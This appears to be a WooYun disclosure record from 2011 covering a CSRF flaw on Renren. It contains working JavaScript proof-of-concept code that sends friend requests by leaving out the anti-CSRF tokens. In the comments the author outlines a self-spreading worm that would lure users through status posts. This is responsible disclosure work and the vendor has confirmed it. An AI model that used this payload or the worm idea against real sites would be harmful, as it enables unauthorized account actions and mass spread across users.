{"id": 21881, "wybug_id": "wooyun-2011-03106", "wybug_title": "人人网CSRF扩大", "wybug_corp": "人人网", "wybug_author": "androidhacker", "wybug_date": "2011-10-24 22:39", "wybug_open_date": "2011-11-23 22:40", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "防护策略绕过", "逻辑错误前台限制绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-10-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-10-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-11-23：\t细节向公众公开  简要描述： 不是刷分，发现这个人人的CSRF真是很多很夸张啊 详细说明：  \n<script>function createXHR(){\treturn window.XMLHttpRequest?\tnew XMLHttpRequest():\tnew ActiveXObject(\"Microsoft.XMLHTTP\");}function post(url,data,sync){\txmlHttp = createXHR();    xmlHttp.open(\"POST\",url,sync);    xmlHttp.setRequestHeader(\"Accept\",\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");    xmlHttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded; charset=UTF-8\");    xmlHttp.withCredentials = \"true\";    xmlHttp.send(data);}function publish(){\turl = 'http://friend.renren.com/ajax_request_friend.do?from=sg_guide_peopleumayknow_profile&';\tdata = 'id=UID&why=&codeFlag=0&code=';\tpost(url,data,true);}function main(){\ttry{\t\tpublish();\t}\tcatch(e)\t{\t    alert(e);\t}\t}</script><img src=\"#\" onerror=\"main()\" width=\"1\" height=\"1\" border=\"0\">\n   漏洞证明：  把UID替换即可以指定加好友加好友只要在表单参数中去掉requestToken和_rtk即可如果要发留言，则只要在表单中去掉ak和requestToken和_rtk参数即可其它地方，没有再研究了，估计有点玄啊   修复方案：  加油   版权声明：转载请注明来源 androidhacker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2011-10-26 18:38 厂商回复： 3q 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-10-24 22:44 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  两个妹子了这下    \n     2011-10-24 22:56 |    \t\tandroidhacker \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:10        | 这个人很懒，什么都没留下)\t\t \n  如果真有，匀你一个:-)    \n     2011-10-25 00:27 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  楼主传蠕虫做录像吧......    \n     2011-10-25 09:55 |    \t\t过客 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:13        )\t\t \n  支持楼上    \n     2011-10-25 15:03 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  做录像多录几个妹子    \n     2011-10-25 15:42 |    \t\t霍家二爷 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:7        | 我撸管这么牛逼还是没妞喜欢我)\t\t \n  蠕后再说    \n     2011-10-25 20:17 |    \t\tandroidhacker \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:10        | 这个人很懒，什么都没留下)\t\t \n  估计guoan叔叔那里有很多蠕虫视频:-)    \n     2011-10-25 20:25 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  楼上再楼上再楼上再楼上再楼上+1    \n     2011-10-26 19:47 |    \t\tandroidhacker \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:10        | 这个人很懒，什么都没留下)\t\t \n  在sinaapp里上传一个让人打开就发一条状态的网页，状态内容诱骗其他人继续打开这个页面，用户UID可以从referrer中获取。应该是能够一定程度广泛传播的。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}